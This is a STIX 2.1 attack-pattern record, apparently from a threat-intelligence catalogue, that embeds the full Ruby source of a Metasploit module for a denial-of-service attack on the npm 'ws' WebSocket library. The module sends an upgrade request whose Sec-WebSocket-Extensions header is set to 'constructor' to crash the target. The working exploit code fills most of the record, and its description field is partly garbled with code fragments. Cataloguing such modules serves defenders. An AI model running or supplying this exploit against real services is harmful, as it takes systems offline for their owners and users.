{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2352f594-474c-4007-8b34-e459229e7bf4",
    "created": "2024-08-14T16:26:09.749735Z",
    "modified": "2024-08-14T16:26:09.74974Z",
    "name": "ws - Denial of Service",
    "description": " This module exploits a Denial of Service vulnerability in npm module \"ws\". By sending a specially crafted value of the Sec-WebSocket-Extensions header on the initial WebSocket upgrade request, the ws component will crash.  'References'     => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/http/ws_dos.rb",
            "external_id": "ws_dos.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Dos\n\n  def initialize\n    super(\n      'Name'           => 'ws - Denial of Service',\n      'Description'    => %q{\n          This module exploits a Denial of Service vulnerability in npm module \"ws\".\n        By sending a specially crafted value of the Sec-WebSocket-Extensions header on the initial WebSocket upgrade request, the ws component will crash.\n      },\n      'References'     =>\n        [\n          ['URL', 'https://nodesecurity.io/advisories/550'],\n          ['CWE', '400'],\n        ],\n      'Author'         =>\n        [\n          'Ryan Knell,  Sonatype Security Research',\n          'Nick Starke, Sonatype Security Research',\n        ],\n      'License'        =>  MSF_LICENSE\n    )\n\n    register_options([\n      Opt::RPORT(3000),\n      OptString.new('TARGETURI', [true, 'The base path', '/']),\n    ],)\n  end\n\n  def run\n    path = datastore['TARGETURI']\n\n    #Create HTTP request\n    req = [\n      \"GET #{path} HTTP/1.1\",\n      \"Connection: Upgrade\",\n      \"Sec-WebSocket-Key: #{Rex::Text.rand_text_alpha(rand(10) + 5).to_s}\",\n      \"Sec-WebSocket-Version: 8\",\n      \"Sec-WebSocket-Extensions: constructor\",  #Adding \"constructor\" as the value for this header causes the DoS\n      \"Upgrade: websocket\",\n      \"\\r\\n\"\n      ].join(\"\\r\\n\");\n\n    begin\n      connect\n      print_status(\"Sending DoS packet to #{peer}\")\n      sock.put(req)\n\n      data = sock.get_once(-1)  #Attempt to retrieve data from the socket\n\n      if data =~ /101/   #This is the expected HTTP status code. IF it's present, we have a valid upgrade response.\n        print_error(\"WebSocket Upgrade request Successful, service not vulnerable.\")\n      else\n        fail_with(Failure::Unknown, \"An unknown error occured\")\n      end\n\n      disconnect\n      print_error(\"DoS packet unsuccessful\")\n\n    rescue ::Rex::ConnectionRefused\n      print_error(\"Unable to connect to #{peer}\")\n    rescue ::Errno::ECONNRESET, ::EOFError\n      print_good(\"DoS packet successful. #{peer} not responding.\")\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ]
}